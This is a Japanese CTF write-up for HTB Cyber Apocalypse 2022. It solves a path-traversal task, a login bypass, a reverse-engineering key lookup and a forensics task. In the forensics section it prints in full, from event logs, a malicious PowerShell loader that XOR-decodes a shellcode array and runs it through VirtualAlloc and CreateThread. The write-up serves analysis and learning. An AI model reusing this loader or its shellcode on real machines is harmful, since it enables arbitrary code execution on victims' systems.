# Cyber Apocalypse CTF 2022: Intergalactic Chase

https://ctftime.org/event/1639

## Misc

### Compressor

Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

#### writeup

限られたコマンドでフラグをゲットする。catでflag.txtを読み出せば良いと判断し、親ディレクトリを参照していくと`../../flag.txt`(`/home/flag.txt`)にあった。

```bash
[*] Sub-directory to work in: 5znz6CuDESAJwiUXDcumqxKN1sSXrWCg/Head
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3
Insert name you want to read: ../../flag.txt
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}
```

## pwn

### Space Pirate: Entrypoint

D12 is one of Golden Fang's missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.

#### writeup

...よくわからないままフラグがとれました。

```bash
$ nc 165.227.224.55 32269


                         Authentication System

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░▒▓▓▓░░▓▓▓▓▓  ░  ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓▒░▓▓▓▓▓ ░   ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░░▓▓▓░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░ ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▒░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓                                                        ▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒░░░▓▓░░░▓▓▒░ ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒░░░▒▓▓░░░▓▓▒ ░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░░░░░▓▓░░░▓▓▓  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▒░░░░▓▓▒  ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░▒░░░▓▓░  ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓     ▓▓▓░▒▓▓▓░░░░░▓▓░  ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▒░▓▓▓░░░░ ▓▓   ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓


1. Scan card 💳
2. Insert password ↪️
> 2
[*] Insert password: a

[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
[-] Invalid option! Intruder detected! 🚨 🚨
```

## rev

### WIDE

We've received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You've managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?
#### writeup

main -> menu(rax_24, rax_21);とmenu関数をみていると、keyっぽい文字列があった。

```c
00000caf                  printf("[X] That entry is encrypted - pl…");
00000cca                  void var_c8;
00000cca                  fgets(&var_c8, 0x10, stdin);
00000ce8                  void var_1c8;
00000ce8                  mbstowcs(&var_1c8, &var_c8, 0x10);
00000d05                  if (wcscmp(&var_1c8, "sup3rs3cr3tw1d3") != 0)
00000d03                  {
00000dc0                      puts("[X]                          Key…");
00000dc5                      continue;
00000dc5                  }
```

```bash
 ./wide db.ex
[*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*]
[*]    Serving your pocket dimension storage needs since 14,012.5 B      [*]
[*]                       Displaying Dimensions....                      [*]
[*]       Name       |              Code                |   Encrypted    [*]
[X] Primus           | people breathe variety practice  |                [*]
[X] Cheagaz          | scene control river importance   |                [*]
[X] Byenoovia        | fighting cast it parallel        |                [*]
[X] Cloteprea        | facing motor unusual heavy       |                [*]
[X] Maraqa           | stomach motion sale valuable     |                [*]
[X] Aidor            | feathers stream sides gate       |                [*]
[X] Flaggle Alpha    | admin secret power hidden        |       *        [*]
Which dimension would you like to examine? 1
The Ice Dimension
Which dimension would you like to examine? 6
[X] That entry is encrypted - please enter your WIDE decryption key: sup3rs3cr3tw1d3
HTB{str1ngs_4r3nt_4lw4ys_4sc11}
```

---

解けなかった問題

## forensics

### pupteer

Planet Longhir is known for it's top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation's communication satellites. The mystery that Miyuki is trying to solve is, how the satellite's location was leaked since it is a top-sercret that only Galactic Federation's council is aware of. Help her analyse the Council's HQ event logs and solve this mystery.

#### writeup

evtxファイルが配られました。windowsのイベントビューアで見ようにも大変。
evtxの解析をしているwriteupを漁ると[python-evtx](https://github.com/williballenthin/python-evtx)のevtx_dump.py(`.evtx` -> `.xml`)が使われていました。これを使って配布されたファイルをxmlに変換しました([puppeteer_evtx_to_xml.py](./puppeteer_evtx_to_xml.py))

`password` でgrepすると`Microsoft-Windows-PowerShell%4Operational.xml`で`C:\sysmgr\sys_mgr.ps1`が起動されてました。内容はAdmin Accountを作成するものでした。

同ファイルにて`C:\sysmgr\special_orders.ps1`も起動していました。このスクリプトは、`Microsoft-Windows-Windows Defender%4Operational.xml`にも載っており、Windows Defenderで検知したことが読み取れました。本スクリプトが悪さをしていると思い、`Microsoft-Windows-PowerShell%4Operational.xml`を再度調べると、16進数が大量に並んでいました(一番下)。Unpack Shellcodeと書かれていたので、ここで間違いなさそうです。

```ps1
# Unpack Shellcode;

for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++)
{
    $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;
}

#Unpack Special Orders!
```

stage1, 2, 3が怪しいため、Powershellのスクリプトを用意し、ASCIIコードでデコードするとフラグが出てきました。

```ps1
[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;
[array]::Reverse($stage2);

$stage3 = $stage1 + $stage2;

#Unpack Special Orders!
for($i=0;$i -lt $stage3.count;$i++){
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}

[System.Text.Encoding]::ASCII.GetString($stage3)
```

```bash
% pwsh ./solver.ps1
HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3...}
```


最初Pythonで再現していたのですが、どうやら`-bxor`がビット単位で演算していたため、成功しませんでした。[参考](https://www.itlab51.com/?p=5883)


```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>3</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:40:31.473396"></TimeCreated>
<EventRecordID>7</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-92d0-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1352" ThreadID="5472"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$OleSPrlmhB = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;

$tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04;

[array]::Reverse($stage2);

$hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40);

$stage3 = $stage1 + $stage2;

[System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);


# Unpack Shellcode;

for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++)
{
    $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;
}

#Unpack Special Orders!

for($i=0;$i -lt $stage3.count;$i++){
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}

$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);
</Data>
<Data Name="ScriptBlockId">3f384b05-3a00-4a65-bbf7-e31b331ac923</Data>
<Data Name="Path">C:\sysmgr\special_orders.ps1</Data>
</EventData>
</Event>
```
